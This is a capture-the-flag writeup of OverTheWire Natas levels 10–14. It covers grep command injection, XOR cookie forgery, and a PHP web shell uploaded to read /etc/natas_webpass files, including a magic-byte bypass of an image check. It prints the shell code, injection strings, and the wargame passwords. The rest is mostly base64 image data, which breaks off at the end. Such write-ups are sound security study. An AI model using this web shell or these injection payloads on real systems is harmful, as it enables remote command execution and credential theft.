# OverTheWire's Natas Challenges 10 to 19 Writeups
> We're back solving these, and it sure does prove a tad more difficult.

### Natas 10

![][image1]  
Security is tighter now. The source code is more restricting:  
![][image2]  
We can still grep everything from our file to show us the output with the following command:

| '^' /etc/natas\_webpass/natas11 |
| :---- |

Then it greps both our password file and the dictionary.txt file:  
![][image3]

### Natas 11

New stuff to look out for on our page:  
![][image4]  
So we have valuable cookies to look out for. Looking for the cookies while inspecting, we find the aforementioned XOR-encrypted cookies - 
<img width="737" height="50" alt="image" src="https://github.com/user-attachments/assets/fbc22651-a4bd-431f-8a3b-2920ff8c7877" /><br/>
We also have a textbox where we can change the background color using hex values. Setting a color modifies our URL, for example:
`http://natas11.natas.labs.overthewire.org/?bgcolor=%23000000` or `http://natas11.natas.labs.overthewire.org/?bgcolor=%23e45eff`, so we notice the value is 23 followed by the actual hex.
Let's now view the sourcecode:
```
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);



?>

```
Considerably lots more to go through this time. Let's start with `loadData()` - we see the cookie and `$defaultData` being used. Can we reverse the cookie back? Our main block is the xor encryption because we do not know the key, we do know the Base64 decoded cookie is the input. And then `xor_encrypt()` iterates through each character of the decoded cookie and XORs it with each character from the key, iterated also (our key is repeated if too short).
But wait! The data contains both `showpassword`, set to `no` by default and `bgcolor` which I can set to whatever, that means I know 2/3 of our equation - the input and the output, and just the key is missing!]
So our encrypted cookie is `EGAgHwQ1IxYYMSQYGSZxTUksPFVHYDEQCC0/GBlgaVVIJDURDSQ1VRY=` (notice I changed %3D to = and %2F to / because they were encoded), and we know our values to be no & ffffff.
I actually didn't know how to decrypt these so I built the PHP script online:
```
$data = array("showpassword"=>"no", "bgcolor"=>"#ffffff");
$enc_cookie = "EGAgHwQ1IxYYMSQYGSZxTUksPFVHYDEQCC0/FGBlgaVVIJDURDSQ1VRY=";

function xor_decrypt($in, $data) {
    $key = $in;
    $text = base64_encode(json_encode($data));
    $outText = '';
    print_r($text);
    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

$key = json_decode(xor_decrypt(base64_decode($enc_cookie), $data));
print_r($key);
```
The print value ended up being `eyJzaG93cGFzc3dvcmQiOiJubyIsImJnY29sb3IiOiIjZmZmZmZmIn0=`, our encoded cookie!
Now it was just pasting the values into CyberChef and letting it do its magic:
<img width="1074" height="601" alt="image" src="https://github.com/user-attachments/assets/ddd5d5bf-b10a-4b79-a2ad-6bc07517b98f" /><br/>
Our key is `kBSw` repeated.
Using this, lets create a cookie where the showpassword value is supposedly true - 
<img width="947" height="635" alt="image" src="https://github.com/user-attachments/assets/0fe11475-70cb-42be-98e1-002ff36cc477" /><br/>
We get a new encrypted cookie - `EGAgHwQ1IxYYMSQYGSZxTUk7NgRJbnEVDCE8GwQwcU1JYTURDSQ1EUk`. Let's go back to Firefox DevTools Storage and replace the current cookie value with the one we've just created and refresh the page.
<img width="562" height="153" alt="image" src="https://github.com/user-attachments/assets/46abdb06-8523-421e-a1b4-9fa87faf50c8" /><br/>
Hopa!

### Natas 12 
We've unlocked file uploading!
<img width="1912" height="262" alt="image" src="https://github.com/user-attachments/assets/7e8abd9e-9cc8-4582-a986-137a9e21b507" /><br/>
Lets again review the source code first:
```
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```
So if we upload a file, we first call the function `makeRandomPathFromFilename()`, that leads to `makeRandomPath()`, where the path is basically `upload/XXXXXXXXXX.{file_extension}` the X are the result of `genRandomString()` which provides us with a 10 character-long random string.
I'm also here to remind you that creds are always kept in `/etc/natas_webpass/natas12`. I have a feeling we should keep that in mind.
So can we play with the file extension? Anyways, I uploaded a random text file to see how the URL modifies, and it's like so:
`http://natas12.natas.labs.overthewire.org/upload/ct3e444vp4.jpg`
The server overrides my extension and replaces it with jpg :( This is done by this input:
```
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
```
What if I can just change this value in the DevTools? I'll upload a simple text file and test it out -
<img width="888" height="145" alt="image" src="https://github.com/user-attachments/assets/ef561a54-abff-465f-833d-6f48b1a44287" /><br/>
It does! Now we can maybe upload a webshell that'll help us out here. I've found a simple PHP webshell online to do our bidding:
```
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
```
Following the link to our new upload we're met with a blank screen. We should interact with our webshell and send a GET request with a cmd value of a command of our choice, I'll just `cat` our known password file. Our URL ended up looking like so - 
`http://natas12.natas.labs.overthewire.org/upload/4o28kjtwnf.php?cmd=cat%20/etc/natas_webpass/natas12`
And at last we're met with the password for Natas 13, `g8ba0olAzaSJuyS4gnmbdVVigAICLG1k`!

### Natas 13
Same stuff is probably bad news:
<img width="1919" height="331" alt="image" src="https://github.com/user-attachments/assets/5cf22ee2-8058-4762-979f-1e932564605a" /><br/>
Lets open up the source code:
```
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```
We are met with a challenge - only uploads of images go through. Whenever we upload anything else we get back a `File is not an image` error. Fine.
It's interesting because even if I do change the extension to some type of image and upload it it still says it's not an image. So how does this `exif_imagetype` function find the extension? Let's google.
<img width="575" height="173" alt="image" src="https://github.com/user-attachments/assets/ba7d6f54-2461-433f-b4d8-ca651f51e1b0" /><br/>
Ok that's interesting - it tries to identify an image using a magic. So what is the magic of jpgs? It's apparently `FF D8 FF`. I've found an [online file hex editor](https://hexed.it/) and added these three bytes at the beginning of the webshell we used for natas12.
<img width="683" height="188" alt="image" src="https://github.com/user-attachments/assets/aa85e83f-30d7-4e90-bcce-63b28d0bc9be" /><br/>
Changing the hidden input extension to `.php` like last time, and uploading this now edited file we're now successful again!
<img width="581" height="151" alt="image" src="https://github.com/user-attachments/assets/d8e867c4-6f1b-4125-a615-91478b25c7b2" /><br/>
Now let's change the URL like last time and celebrate our victory!
<img width="1034" height="118" alt="image" src="https://github.com/user-attachments/assets/622d5e9a-13bb-4b3d-8454-126d36c1dc27" />
<br/>
Aha!

### Natas 14
A login form!
<img width="1913" height="276" alt="image" src="https://github.com/user-attachments/assets/98c8a1e9-57c4-4517-88db-cf5320a2c057" /><br/>





[image1]: <data:image/png;base64,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>

[image2]: <data:image/png;base64,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